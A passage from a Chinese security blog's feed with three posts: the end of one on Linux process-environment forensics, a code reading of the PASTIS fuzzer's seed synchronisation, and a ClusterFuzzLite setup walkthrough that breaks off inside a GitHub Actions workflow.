172.16.2.3 22 这个比下面的多了本机的网卡的ip</p></li><li><p>SSH_CLIENT=10.82.X.X 5561 22 这两个就是ssh的信息，10.82.X.X就是攻击者所使用的ip，该ip或许只是攻击者的跳板</p></li><li><p>SHELL=/bin/bash 启动所使用的shell</p></li><li><p>PWD=/tmp  启动时的路径</p></li><li><p>OLDPWD=/root 进入/tmp目录之前的路径</p></li><li><p>USER=root 启动进程的用户</p></li></ul><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>可以看到，在调查进程活动之前，不要草率地终止可疑的进程。在弄清楚进程活动之前就终止进程，会立即丢失许多有用的信息，比如进程环境变量。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://sandflysecurity.com/blog/using-linux-process-environment-variables-for-live-forensics/" target="_blank" rel="noopener">https://sandflysecurity.com/blog/using-linux-process-environment-variables-for-live-forensics/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;注：下面来自半翻译，半实践&lt;/p&gt;
&lt;p&gt;对Linux进程进行取证，可以通过&lt;code&gt;/proc/&amp;lt;PID&amp;gt;/environ&lt;/code&gt;来查看某个进程的环境变量，来获取一些信息。&lt;/p&gt;
&lt;p&gt;所以说，遇到可疑的进程不要立即杀掉，不然取证都可能无从下手。&lt;/
      
    
    </summary>
    
    
      <category term="环境变量" scheme="https://www.giantbranch.cn/tags/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/"/>
    
      <category term="取证" scheme="https://www.giantbranch.cn/tags/%E5%8F%96%E8%AF%81/"/>
    
  </entry>
  
  <entry>
    <title>pastis样本同步代码阅读记录</title>
    <link href="https://www.giantbranch.cn/2023/06/29/pastis%E6%A0%B7%E6%9C%AC%E5%90%8C%E6%AD%A5%E4%BB%A3%E7%A0%81%E9%98%85%E8%AF%BB%E8%AE%B0%E5%BD%95/"/>
    <id>https://www.giantbranch.cn/2023/06/29/pastis样本同步代码阅读记录/</id>
    <published>2023-06-29T00:00:00.000Z</published>
    <updated>2023-10-13T13:14:33.130Z</updated>
    
    <content type="html"><![CDATA[<p>简单看下<a href="https://github.com/quarkslab/pastis/的样本同步相关的代码" target="_blank" rel="noopener">https://github.com/quarkslab/pastis/的样本同步相关的代码</a></p><h1 id="fuzz端"><a href="#fuzz端" class="headerlink" title="fuzz端"></a>fuzz端</h1><p>fuzz端就两个功能，发送新增的样本或者crash，以及接收新样本</p><h2 id="发送新增样本或者crash"><a href="#发送新增样本或者crash" class="headerlink" title="发送新增样本或者crash"></a>发送新增样本或者crash</h2><p>以afl++为例： <a href="https://github.com/quarkslab/pastis/blob/56f71b9c7cf25ddf2035d1abbe35f67d55378bb9/engines/pastis-aflpp/pastisaflpp/driver.py#L51" target="_blank" rel="noopener">https://github.com/quarkslab/pastis/blob/56f71b9c7cf25ddf2035d1abbe35f67d55378bb9/engines/pastis-aflpp/pastisaflpp/driver.py#L51</a></p><p>会对corpus_dir和crash_dir的文件创建进行hook，一旦有新的文件创建，就调用<code>__send_seed</code>和<code>__send_crash</code>函数, afl的fuzzer_stats文件有修改也会调用<code>__send_telemetry</code>发送</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># Configure hookds on workspace</span><br><span class="line">self.workspace.add_creation_hook(self.workspace.corpus_dir, self.__send_seed)</span><br><span class="line">self.workspace.add_creation_hook(self.workspace.crash_dir, self.__send_crash)</span><br><span class="line">self.workspace.add_file_modification_hook(self.workspace.stats_dir, self.__send_telemetry)</span><br></pre></td></tr></table></figure><p>下面就是发送函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">def __send_seed(self, filename: Path):</span><br><span class="line">    self.__send(filename, SeedType.INPUT)</span><br><span class="line"></span><br><span class="line">def __send_crash(self, filename: Path):</span><br><span class="line">    # Skip README file that AFL adds to the crash folder.</span><br><span class="line">    if filename.name != &apos;README.txt&apos;:</span><br><span class="line">        self.__send(filename, SeedType.CRASH)</span><br><span class="line"></span><br><span class="line">def __send(self, filename: Path, typ: SeedType):</span><br><span class="line">    self._tot_seeds += 1</span><br><span class="line">    file = Path(filename)</span><br><span class="line">    raw = file.read_bytes()</span><br><span class="line">    h = self.hash_seed(raw)</span><br><span class="line">    logging.debug(f&apos;[&#123;typ.name&#125;] Sending new: &#123;h&#125; [&#123;self._tot_seeds&#125;]&apos;)</span><br><span class="line">    if h not in self._seed_recvs:</span><br><span class="line">        self._agent.send_seed(typ, raw)</span><br><span class="line">    else:</span><br><span class="line">        logging.info(&quot;seed (previously sent) do not send it back&quot;)</span><br><span class="line">    self._queue_to_send.append((filename, True if typ == SeedType.CRASH else False))</span><br></pre></td></tr></table></figure><h2 id="接收新样本"><a href="#接收新样本" class="headerlink" title="接收新样本"></a>接收新样本</h2><p>在<code>class AFLPPDriver</code>类的<code>__init__</code>函数会调用<code>self.__setup_agent()</code>来初始化回调函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">def __setup_agent(self):</span><br><span class="line">    # Register callbacks.</span><br><span class="line">    self._agent.register_seed_callback(self.__seed_received)</span><br><span class="line">    self._agent.register_stop_callback(self.__stop_received)</span><br></pre></td></tr></table></figure><p>接收函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def __seed_received(self, typ: SeedType, seed: bytes):</span><br><span class="line">    h = self.hash_seed(seed)</span><br><span class="line">    logging.info(f&quot;[SEED] received  &#123;h&#125; (&#123;typ.name&#125;)&quot;)</span><br><span class="line">    self._seed_recvs.add(h)</span><br><span class="line">    self.add_seed(seed)</span><br></pre></td></tr></table></figure><p>通过add_seed可以看到，通过md5文件名存储，说明通过md5去重的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def add_seed(self, seed: bytes):</span><br><span class="line">    seed_path = self.workspace.dynamic_input_dir / f&quot;seed-&#123;hashlib.md5(seed).hexdigest()&#125;&quot;</span><br><span class="line">    seed_path.write_bytes(seed)</span><br></pre></td></tr></table></figure><h1 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h1><p>下面是收到样本（seed）的回调函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">def register_seed_callback(self, cb: Callable) -&gt; None:</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Register a callback called when an input seed is received from the</span><br><span class="line">    broker. The callback function take 2 parameters seed type and content.</span><br><span class="line"></span><br><span class="line">    :param cb: callback function</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    self.register_callback(MessageType.INPUT_SEED, cb)</span><br></pre></td></tr></table></figure><p>在set_proxy函数中会设置这个回调函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">def _register_all(self):</span><br><span class="line">    self.register_seed_callback(self.seed_received)</span><br><span class="line">    self.register_hello_callback(self.hello_received)</span><br><span class="line">    self.register_log_callback(self.log_received)</span><br><span class="line">    self.register_telemetry_callback(self.telemetry_received)</span><br><span class="line">    self.register_stop_coverage_callback(self.stop_coverage_received)</span><br><span class="line">    self.register_data_callback(self.data_received)</span><br></pre></td></tr></table></figure><p>而在PastisBroker类的<code>__init__</code>函数会调用<code>self._register_all()</code>，收到种子后就调用seed_received函数</p><p>可以看到这里哦天哪故宫md5计算，但是没用来判断，只是用<code>_seed_pool</code>这个字段判断，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">def seed_received(self, cli_id: bytes, typ: SeedType, seed: bytes):</span><br><span class="line">    cli = self.get_client(cli_id)</span><br><span class="line">    if not cli:</span><br><span class="line">        return</span><br><span class="line">    is_new = seed not in self._seed_pool</span><br><span class="line">    h = md5(seed).hexdigest()</span><br><span class="line"></span><br><span class="line">    # Show log message and save seed to file</span><br><span class="line">    self.statmanager.update_seed_stat(cli, typ)  # Add info only if new</span><br><span class="line">    cli.log(LogLevel.INFO, f&quot;seed &#123;h&#125; [&#123;self._colored_seed_type(typ)&#125;][&#123;self._colored_seed_newness(is_new)&#125;]&quot;)</span><br><span class="line">    cli.add_own_seed(seed)  # Add seed in client&apos;s seed</span><br><span class="line">    self.write_seed(typ, cli.strid, seed) # Write seed to file</span><br><span class="line"></span><br><span class="line">    if is_new:</span><br><span class="line">        self._seed_pool[seed] = typ  # Save it in the local pool</span><br><span class="line">    else:</span><br><span class="line">        pass</span><br><span class="line">        # logging.warning(f&quot;receive duplicate seed &#123;h&#125; by &#123;cli.strid&#125;&quot;)</span><br><span class="line"></span><br><span class="line">    # Iterate on all clients and send it to whomever never received it</span><br><span class="line">    if self.broker_mode == BrokingMode.FULL:</span><br><span class="line">        self.send_seed_to_all_others(cli.netid, typ, seed)</span><br><span class="line"></span><br><span class="line">    if self.is_proxied:  # Forward it to the proxy</span><br><span class="line">        self._proxy.send_seed(typ, seed)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;简单看下&lt;a href=&quot;https://github.com/quarkslab/pastis/的样本同步相关的代码&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/quarkslab/pastis/的样本同步相关的代
      
    
    </summary>
    
    
      <category term="样本同步" scheme="https://www.giantbranch.cn/tags/%E6%A0%B7%E6%9C%AC%E5%90%8C%E6%AD%A5/"/>
    
  </entry>
  
  <entry>
    <title>试用clusterfuzzlite</title>
    <link href="https://www.giantbranch.cn/2023/06/20/%E8%AF%95%E7%94%A8clusterfuzzlite/"/>
    <id>https://www.giantbranch.cn/2023/06/20/试用clusterfuzzlite/</id>
    <published>2023-06-20T00:00:00.000Z</published>
    <updated>2023-10-13T13:14:33.134Z</updated>
    
    <content type="html"><![CDATA[<p>clusterfuzzlite是是一种持续的模糊测试解决方案，作为持续集成 (CI) 工作流的一部分运行，比如我们一旦push代码，便可以自动build，之后自动fuzz。</p><p>比如它支持GitHub Actions，GitLab，Google Cloud Build和Prow，我们最常见到的应该是GitHub Actions</p><h1 id="如何让项目支持clusterfuzzlite呢"><a href="#如何让项目支持clusterfuzzlite呢" class="headerlink" title="如何让项目支持clusterfuzzlite呢"></a>如何让项目支持clusterfuzzlite呢</h1><p>ClusterFuzzLite 重用了 OSS-Fuzz 工具链来简化构建。这意味着 ClusterFuzzLite 将在 docker 容器中构建您的项目。所以加入你熟悉OSS-Fuzz，这就看着很像了。只不过多了一些参数，比如–external</p><p><strong>有一个问题就是他这个只支持libfuzzer！！！，所以局限性还是有的。</strong></p><h2 id="环境配置及文件编辑"><a href="#环境配置及文件编辑" class="headerlink" title="环境配置及文件编辑"></a>环境配置及文件编辑</h2><p>首先环境的配置好：</p><ul><li>python什么的必备</li><li>安装好docker</li><li>下载oss-fuzz： git clone <a href="https://github.com/google/oss-fuzz.git" target="_blank" rel="noopener">https://github.com/google/oss-fuzz.git</a></li></ul><p>首先需要在项目根目录新建<code>.clusterfuzzlite</code>文件夹，包含下面三个文件</p><ul><li>.clusterfuzzlite/project.yaml </li><li>.clusterfuzzlite/Dockerfile</li><li>.clusterfuzzlite/build.sh </li></ul><p>上面的文件不用我们新建，可以使用命令新建模板</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ cd /path/to/oss-fuzz</span><br><span class="line">$ export PATH_TO_PROJECT=&lt;path_to_your_project&gt;</span><br><span class="line">$ python infra/helper.py generate --external --language=c++ $PATH_TO_PROJECT</span><br></pre></td></tr></table></figure><p>以<code>https://github.com/libexpat/libexpat.git</code>为例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd / &amp;&amp; git clone https://github.com/libexpat/libexpat.git expat</span><br><span class="line">export PATH_TO_PROJECT=/expat</span><br><span class="line">python infra/helper.py generate --external --language=c $PATH_TO_PROJECT</span><br></pre></td></tr></table></figure><p>主要编辑build.sh文件即可，主要最后编译出来的fuzzer需要复制到$OUT即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">cd $SRC/expat/</span><br><span class="line"></span><br><span class="line">: $&#123;LD:=&quot;$&#123;CXX&#125;&quot;&#125;</span><br><span class="line">: $&#123;LDFLAGS:=&quot;$&#123;CXXFLAGS&#125;&quot;&#125;  # to make sure we link with sanitizer runtime</span><br><span class="line"></span><br><span class="line">cmake_args=(</span><br><span class="line">    # Specific to Expat</span><br><span class="line">    -DEXPAT_BUILD_FUZZERS=ON</span><br><span class="line">    -DEXPAT_OSSFUZZ_BUILD=ON</span><br><span class="line">    -DEXPAT_SHARED_LIBS=OFF</span><br><span class="line"></span><br><span class="line">    # C compiler</span><br><span class="line">    -DCMAKE_C_COMPILER=&quot;$&#123;CC&#125;&quot;</span><br><span class="line">    -DCMAKE_C_FLAGS=&quot;$&#123;CFLAGS&#125;&quot;</span><br><span class="line"></span><br><span class="line">    # C++ compiler</span><br><span class="line">    -DCMAKE_CXX_COMPILER=&quot;$&#123;CXX&#125;&quot;</span><br><span class="line">    -DCMAKE_CXX_FLAGS=&quot;$&#123;CXXFLAGS&#125;&quot;</span><br><span class="line"></span><br><span class="line">    # Linker</span><br><span class="line">    -DCMAKE_LINKER=&quot;$&#123;LD&#125;&quot;</span><br><span class="line">    -DCMAKE_EXE_LINKER_FLAGS=&quot;$&#123;LDFLAGS&#125;&quot;</span><br><span class="line">    -DCMAKE_MODULE_LINKER_FLAGS=&quot;$&#123;LDFLAGS&#125;&quot;</span><br><span class="line">    -DCMAKE_SHARED_LINKER_FLAGS=&quot;$&#123;LDFLAGS&#125;&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">mkdir -p build</span><br><span class="line">cd build</span><br><span class="line">cmake ../expat &quot;$&#123;cmake_args[@]&#125;&quot;</span><br><span class="line">make -j$(nproc)</span><br><span class="line"></span><br><span class="line">for fuzzer in fuzz/*;</span><br><span class="line">do</span><br><span class="line">  cp $fuzzer $OUT</span><br><span class="line">done</span><br></pre></td></tr></table></figure><h2 id="本地测试"><a href="#本地测试" class="headerlink" title="本地测试"></a>本地测试</h2><p> 上搞完就可以本地测试了</p><ol><li>构建您的 docker 镜像和 fuzz 目标</li></ol><p>模板命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python infra/helper.py build_image --external $PATH_TO_PROJECT</span><br><span class="line">$ python infra/helper.py build_fuzzers --external $PATH_TO_PROJECT --sanitizer &lt;address/undefined/memory&gt;</span><br></pre></td></tr></table></figure><p>实际命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python infra/helper.py build_image --external $PATH_TO_PROJECT</span><br><span class="line">python infra/helper.py build_fuzzers --external $PATH_TO_PROJECT --sanitizer address</span><br></pre></td></tr></table></figure><p>假如没问题说明build.sh写得没问题，环境库依赖也没问题</p><ol start="2"><li>通过运行 check_build 命令查找要修复的常见构建问题</li></ol><p>这将检查您的模糊测试目标是否使用正确的sanitizer编译，并且在模糊测试几秒钟后不会崩溃。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python infra/helper.py check_build --external $PATH_TO_PROJECT --sanitizer &lt;address/undefined/memory&gt;</span><br></pre></td></tr></table></figure><ol start="3"><li>运行特定的模糊测试目标，使用 run_fuzzer</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python infra/helper.py run_fuzzer --external --corpus-dir=&lt;path-to-temp-corpus-dir&gt; $PATH_TO_PROJECT &lt;fuzz_target&gt;</span><br></pre></td></tr></table></figure><blockquote><p><code>&lt;path-to-temp-corpus-dir&gt;</code>就是宿主机你自己准备好的种子文件路径<br><code>&lt;fuzz_target&gt;</code>是编译出来的fuzzer的名字</p></blockquote><ol start="4"><li>如果您打算使用 ClusterFuzzLite 的代码覆盖率报告功能，最好测试覆盖率报告生成是否有效。这将使用本地语料库目录中上一个 run_fuzzer 步骤生成的语料库。</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python infra/helper.py build_fuzzers --external --sanitizer coverage $PATH_TO_PROJECT</span><br><span class="line">$ python infra/helper.py coverage --external $PATH_TO_PROJECT --fuzz-target=&lt;fuzz_target&gt; --corpus-dir=&lt;path-to-temp-corpus-dir&gt;</span><br></pre></td></tr></table></figure><p>步骤4是可选的，run_fuzzer没问题即可就行了</p><p><img src="http://pic.giantbranch.cn/pic/1687249478660.png" alt></p><h1 id="Running-ClusterFuzzLite"><a href="#Running-ClusterFuzzLite" class="headerlink" title="Running ClusterFuzzLite"></a>Running ClusterFuzzLite</h1><p>ClusterFuzzLite可以以pull request为触发，也可以cron定时触发</p><p>下面就以GitHub Actions为例了，需要在.github/workflows目录新建文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.github/workflows/cflite_pr.yml (for PR fuzzing, pull request为触发)</span><br><span class="line">.github/workflows/cflite_build.yml (for continuous builds, 用于持续构建，push代码就执行build)</span><br><span class="line">.github/workflows/cflite_batch.yml (for batch fuzzing，用于批量模糊测试)</span><br><span class="line">.github/workflows/cflite_cron.yml(for tasks done on a cron schedule: pruning and coverage)</span><br></pre></td></tr></table></figure><p>之后展示了一些默认的配置设置，默认配置已经适用于大多数项目</p><p>.github/workflows/cflite_pr.yml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">name: ClusterFuzzLite PR fuzzing</span><br><span class="line">on:</span><br><span class="line">  pull_request:</span><br><span class="line">    paths:</span><br><span class="line">      - &apos;**&apos;</span><br><span class="line">permissions: read-all</span><br><span class="line">jobs:</span><br><span class="line">  PR:</span><br><span class="line">    runs-on: ubuntu-latest</span><br><span class="line">    concurrency:</span><br><span class="line">      group: $&#123;&#123; github.workflow &#125;&#125;-$&#123;&#123; matrix.sanitizer &#125;&#125;-$&#123;&#123; github.ref &#125;&#125;</span><br><span class="line">      cancel-in-progress: true</span><br><span class="line">    strategy:</span><br><span class="line">      fail-fast: false</span><br><span class="line">      matrix:</span><br><span class="line">        sanitizer:</span><br><span class="line">        - address</span><br><span class="line">        # Override this with the sanitizers you want.</span><br><span class="line">        # - undefined</span><br><span class="line">        # - memory</span><br><span class="line">    steps:</span><br><span class="line">    - name: Build Fuzzers ($&#123;&#123; matrix.sanitizer &#125;&#125;)</span><br><span class="line">      id: build</span><br><span class="line">      uses: google/clusterfuzzlite/actions/build_fuzzers@v1</span><br><span class="line">      with:</span><br><span class="line">        language: c++ # Change this to the language you are fuzzing.</span><br><span class="line">        github-token: $&#123;&#123; secrets.GITHUB_TOKEN &#125;&#125;</span><br><span class="line">        sanitizer: $&#123;&#123; matrix.sanitizer &#125;&#125;</span><br><span class="line">        # Optional but recommended: used to only run fuzzers that are affected</span><br><span class="line">        # by the PR.</span><br><span class="line">        # See later section on &quot;Git repo for storage&quot;.</span><br><span class="line">        # storage-repo: https://$&#123;&#123; secrets.PERSONAL_ACCESS_TOKEN &#125;&#125;@github.com/OWNER/STORAGE-REPO-NAME.git</span><br><span class="line">        # storage-repo-branch: main   # Optional. Defaults to &quot;main&quot;</span><br><span class="line">        # storage-repo-branch-coverage: gh-pages  # Optional. Defaults to &quot;gh-pages&quot;.</span><br><span class="line">    - name: Run Fuzzers ($&#123;&#123; matrix.sanitizer &#125;&#125;)</span><br><span class="line">      id: run</span><br><span class="line">      uses: google/clusterfuzzlite/actions/run_fuzzers@v1</span><br><span class="line">      with:</span><br><span class="line">        github-token: $&#123;&#123; secrets.GITHUB_TOKEN &#125;&#125;</span><br><span class="line">        fuzz-seconds: 600</span><br><span class="line">        mode: &apos;code-change&apos;</span><br><span class="line">        sanitizer: $&#123;&#123; matrix.sanitizer &#125;&#125;</span><br><span class="line">        # Optional but recommended: used to download the corpus produced by</span><br><span class="line">        # batch fuzzing.</span><br><span class="line">        # See later section on &quot;Git repo for storage&quot;.</span><br><span class="line">        # storage-repo: https://$&#123;&#123; secrets.PERSONAL_ACCESS_TOKEN &#125;&#125;@github.com/OWNER/STORAGE-REPO-NAME.git</span><br><span class="line">        # storage-repo-branch: main   # Optional. Defaults to &quot;main&quot;</span><br><span class="line">        # storage-repo-branch-coverage: gh-pages  # Optional. Defaults to &quot;gh-pages&quot;.</span><br></pre></td></tr></table></figure><p>字段解析：</p><blockquote><p>language： 更改为目标代码的语言<br>sanitizers： 更改或启用更多消毒剂。<br>fuzz-seconds： 更改模糊测试的时间。<br>parallel-fuzzing：使用并行模糊测试。</p></blockquote><p>接下是.github/workflows/cflite_batch.yml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">name: ClusterFuzzLite batch fuzzing</span><br><span class="line">on:</span><br><span class="line">  schedule:</span><br><span class="line">    - cron: &apos;0 0/6 * * *&apos;  # Every 6th hour. Change this to whatever is suitable.</span><br><span class="line">permissions: read-all</span><br><span class="line">jobs:</span><br><span class="line">  BatchFuzzing:</span><br><span class="line">    runs-on: ubuntu-latest</span><br><span class="line">    strategy:</span><br><span class="line">      fail-fast: false</span><br><span class="line">      matrix:</span><br><span class="line">        sanitizer:</span><br><span class="line">        - address</span><br><span class="line">        # Override this with the sanitizers you want.</span><br><span class="line">        # - undefined</span><br><span class="line">        # - memory</span><br><span class="line">    steps:</span><br><span class="line">    - name: Build Fuzzers ($&#123;&#123; matrix.sanitizer &#125;&#125;)</span><br><span class="line">      id: build</span><br><span class="line">      uses: google/clusterfuzzlite/actions/build_fuzzers@v1</span><br><span class="line">      with:</span><br><span class="line">        language: c++ # Change this to the language you are fuzzing.</span><br><span class="line">        sanitizer: $&#123;&#123; matrix.sanitizer &#125;&#125;</span><br><span class="line">    - name: Run Fuzzers ($&#123;&#123; matrix.sanitizer &#125;&#125;)</span><br><span class="line">      id: run</span><br><span class="line">      uses: google/clusterfuzzlite/actions/run_fuzzers@v1</span><br><span class="line">      with:</span><br><span class="line">        github-token: $&#123;&#123; secrets.GITHUB_TOKEN &#125;&#125;</span><br><span class="line">        fuzz-seconds: 3600</span><br><span class="line">        mode: &apos;batch&apos;</span><br><span class="line">        sanitizer: $&#123;&#123; matrix.sanitizer &#125;&#125;</span><br><span class="line">        # Optional but recommended: For storing certain artifacts from fuzzing.</span><br><span class="line">        # See later section on &quot;Git repo for storage&quot;.</span><br><span class="line">        # storage-repo: https://$&#123;&#123; secrets.PERSONAL_ACCESS_TOKEN &#125;&#125;@github.com/OWNER/STORAGE-REPO-NAME.git</span><br><span class="line">        # storage-repo-branch: main   # Optional. Defaults to &quot;main&quot;</span><br><span class="line">        # storage-repo-branch-coverage: gh-pages  # Optional. Defaults to &quot;gh-pages&quot;.</span><br></pre></td></tr></table></figure><p>.github/workflows/cflite_build.yml </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">name: ClusterFuzzLite continuous builds</span><br><span class="line">on:</span><br><span class="line">  push:</span><br><span class="line">    branches:</span><br><span class="line">      - main  # Use your actual default branch here.</span><br><span class="line">permissions: read-all</span><br><span class="line">jobs:</span><br><span class="line">  Build:</span><br><span class="line">   runs-on: ubuntu-latest</span><br><span class="line">   concurrency:</span><br><span class="line">     group: $&#123;&#123; github.workflow &#125;&#125;-$&#123;&#123; matrix.sanitizer &#125;&#125;-$&#123;&#123; github.ref &#125;&#125;</span><br><span class="line">     cancel-in-progress: true</span><br><span class="line">   strategy:</span><br><span class="line">     fail-fast: false</span><br><span class="line">     matrix:</span><br><span class="line">        sanitizer:</span><br><span class="line">        - address</span><br><span class="line">        # Override this with the sanitizers you want.</span><br><span class="line">        # - undefined</span><br><span class="line">        # - memory</span><br><span class="line">   steps:</span><br><span class="line">   - name: Build Fuzzers ($&#123;&#123; matrix.sanitizer &#125;&#125;)</span><br><span class="line">     id: build</span><br><span class="line">     uses: google/clusterfuzzlite/actions/build_fuzzers@v1</span><br><span class="line">     with:</span><br><span class="line">        language: c++ # Change this to the language you are fuzzing.</span><br><span class="line">        sanitizer: $&#123;&#123; matrix.sanitizer &#125;&#125;</span><br><span class="line">        upload-build: true</span><br></pre></td></tr></table></figure><p>.github/workflows/cflite_cron.yml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 